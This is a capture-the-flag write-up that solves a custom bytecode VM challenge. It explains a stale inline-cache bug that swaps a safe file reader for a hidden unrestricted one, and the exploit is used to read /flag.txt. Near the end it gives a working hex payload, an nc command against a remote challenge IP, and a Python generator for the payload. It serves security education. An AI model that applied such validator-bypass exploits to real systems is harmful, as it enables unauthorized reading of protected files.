# Bring Your Own Program — Write up (234 solves)

Flag: `uoftctf{c4ch3_m3_1n11n3_h0w_80u7_d4h??}`

## What this challenge is “hiding”

The server runs a small custom bytecode VM (an “emulator for an unknown architecture”). You send it a program as a hex string and it executes it.

The VM exposes one global capability object called `caps`. One of the capabilities is `io`, which *looks* like it only lets you read files from `/data/public`. The real flag lives at `/flag.txt`, and the challenge tries to prevent you from reading it.

The trick: there is **a hidden unsafe file-read primitive** that can read *any* absolute path, but the VM’s bytecode validator blocks direct access to it. We bypass that block by abusing a **bug in the VM’s inline-cache implementation**.

## Where to look in the provided files

- `src/chal.js` contains:
  - the input parser (hex → bytes),
  - the program format (`z()`),
  - the bytecode validator (`U()`),
  - the VM (`FT.run()`),
  - the capability construction (`caps`), including file-read helpers `F0`/`F1`.
- `Dockerfile` shows the flag is inside the container at `/flag.txt`.

## 1) Program format (what you send)

Your input is a hex string. The server converts it to bytes and parses it like this:

```
byte 0: nr = number of registers (1..64)
byte 1: nc = number of constants (0..128)

then nc constants:
  0x01: Float64 (8 bytes, little-endian)
  0x02: String (u16 length little-endian, then UTF-8 bytes)

then the remaining bytes are the bytecode (max 0x4000 bytes)
```

## 2) The important VM instructions (opcodes)

You can read the full interpreter loop in `FT.run()` in `src/chal.js`, but here are the ones we use:

- `0x01` **LOAD_CONST**: `01 dst constIdx`
  - `reg[dst] = consts[constIdx]`
- `0x02` **LOAD_GLOBAL**: `02 dst constIdx`
  - `reg[dst] = globals[consts[constIdx]]`
  - Validator only allows the string constant `"caps"`, so effectively this is “load caps”.
- `0x20` **GET_PROP**: `20 dst objReg key`
  - `reg[dst] = obj[key]`
- `0x21` **GET_METHOD**: `21 outFn outThis objReg key`
  - resolves `obj[key]` along a prototype chain and writes:
    - `reg[outFn] = resolvedValue`
    - `reg[outThis] = obj`
  - **also populates/uses an inline cache keyed by the bytecode address**
- `0x30` **CALL**: `30 dst fnReg thisReg argc argReg...`
  - calls a function wrapper and stores its return value
- `0x31` **RETURN**: `31 reg`
- `0x60` **JMP**: `60 off16` (signed 16-bit, little-endian)
- `0x61` **JMP_IF**: `61 condReg off16` (jump if truthy)
- `0x70` **DICT_CONVERT**: `70 objReg key`
  - converts the *object that holds `key` in the prototype chain* into “dictionary mode”.

**Key restriction (important!):** the validator only allows keys in `{1,2,3,4,10,11}`. Key `0` is forbidden.

## 3) Understanding `caps` (the allowed abilities)

The VM uses a tiny object system:

- `class v` is an object with a prototype pointer `p`
- properties are stored in an internal “shape” (`sh`) + a slot array (`sl`)
- when an object changes, it may switch to “dictionary mode” (`dm=true`)
- there is an inline-cache in the VM for speeding up method lookups

The global `caps` object is built like this (simplified):

- `caps[3]` is the `io` object.
- The `io` object has a prototype chain: `F7 -> F6 -> F5`.
- The **interesting properties are on `F5`**:
  - key `10` (`0x0a`) → `F1` (safe read)
  - key `0` (`0x00`) → `F0` (unsafe absolute-path read)

### The two file read helpers

In `src/chal.js`:

- `F1(path)` (safe):
  - rejects absolute paths
  - resolves under `/data/public`
  - refuses escaping that directory
- `F0(path)` (unsafe, hidden):
  - **requires** an absolute path
  - reads that file directly

The challenge tries to protect `/flag.txt` by:

1. Only exposing `caps`, not the full Node.js environment.
2. Only allowing bytecode keys `{1,2,3,4,10,11}`.
3. Putting the dangerous reader at key `0`, which you supposedly can’t request.

## 4) The bug we exploit: stale inline cache + slot reordering

Opcode `0x21` (**GET_METHOD**) performs a prototype-chain lookup and then caches the result. What it caches (simplified):

- receiver “shape id”
- property key
- a “version” number `x`
- prototype depth to the holder object
- slot index inside the holder’s slot array (`sl`)

Opcode `0x70` (**DICT_CONVERT**) converts the *holder* object into dictionary mode. During that conversion it:

- copies properties into a map
- **sorts them by key**
- and rewrites the slot array `sl` in sorted-key order

But: it **does not update** the “key → slot index” mapping that the inline cache assumes is stable.

### Why that gives us the hidden function

On the holder object `F5`, the properties were inserted in this order:

1. key 10 → `F1`
2. key 0  → `F0`

So before conversion:

- slot 0 = value for key 10 = `F1`
- slot 1 = value for key 0  = `F0`

After `DICT_CONVERT`, properties are sorted by key `[0, 10]`, so:

- slot 0 becomes the value for key 0  = `F0`
- slot 1 becomes the value for key 10 = `F1`

If we can make the VM reuse an inline cache entry that still says:

> “for key 10, use slot index 0”

then `io[10]` will incorrectly return **`F0`** even though we asked for key 10.

### The “version” guard and how we avoid it

There is a global “version” `x` intended to invalidate caches when objects change. `DICT_CONVERT` only increments `x` if the **holder object** was marked “touched”.

But the method lookup marks the **receiver** as touched, not the holder up the prototype chain, so we can:

1. Populate the cache (touches receiver only),
2. Convert the holder (holder not touched → version not incremented),
3. Re-run the exact same GET_METHOD instruction (same bytecode address → same cache entry),
4. Get the wrong (but useful) function.

This is why the flag text jokes about caching/inlining.

## 5) Building the exploit program (step by step)

We’ll use 7 registers (`r0..r6`) and 3 constants:

- const 0: `"caps"`
- const 1: `"/flag.txt"`
- const 2: float `1.0` (used as a boolean “done” flag for a tiny loop)

### High-level pseudo-assembly

```
r0 = GLOBAL["caps"]
r1 = r0[3]                 ; io object
r2 = "/flag.txt"

L:
(r4,r5) = METHOD r1[10]     ; cache is created here the first time
if r3 jump CALL
DICT_CONVERT holder_of(r1,10)
r3 = 1.0
jump L

CALL:
r6 = r4.call(r5, r2)        ; r4 is now F0 because of the stale cache
return r6
```

The loop is important because the inline cache is keyed by the **bytecode address** of the `GET_METHOD` instruction. We need to execute the *same* `GET_METHOD` twice:

- 1st time: create cache (returns safe `F1`, but we don’t call it)
- convert holder slots
- 2nd time: reuse stale cache (returns unsafe `F0`)

## 6) Final payload and how to run it

Final hex program (send as one line):

```
0703020400636170730209002f666c61672e74787401000000000000f03f02000020010003010201210405010a6103090070010a01030260eeff3006040501023106
```

Run against the remote:

```bash
printf '%s\n' 0703020400636170730209002f666c61672e74787401000000000000f03f02000020010003010201210405010a6103090070010a01030260eeff3006040501023106 | nc 35.245.96.82 5000
```

It prints the flag:

`uoftctf{c4ch3_m3_1n11n3_h0w_80u7_d4h??}`

## Appendix: a tiny generator (optional)

If you want to generate the bytes yourself:

```py
import struct, binascii

nr = 7
consts = []
consts.append(b"\x02" + struct.pack("<H", 4) + b"caps")
consts.append(b"\x02" + struct.pack("<H", 9) + b"/flag.txt")
consts.append(b"\x01" + struct.pack("<d", 1.0))

code = bytes([
    0x02,0x00,0x00,          # r0 = GLOBAL["caps"]
    0x20,0x01,0x00,0x03,     # r1 = r0[3]
    0x01,0x02,0x01,          # r2 = "/flag.txt"
    0x21,0x04,0x05,0x01,0x0A,# (r4,r5)=METHOD r1[10]
    0x61,0x03,0x09,0x00,     # if r3 jump +9
    0x70,0x01,0x0A,          # DICT_CONVERT holder_of(r1,10)
    0x01,0x03,0x02,          # r3 = 1.0
    0x60,0xEE,0xFF,          # jump -18
    0x30,0x06,0x04,0x05,0x01,0x02,  # r6 = call r4 with this=r5, [r2]
    0x31,0x06,               # return r6
])

blob = bytes([nr, len(consts)]) + b"".join(consts) + code
print(binascii.hexlify(blob).decode())
```

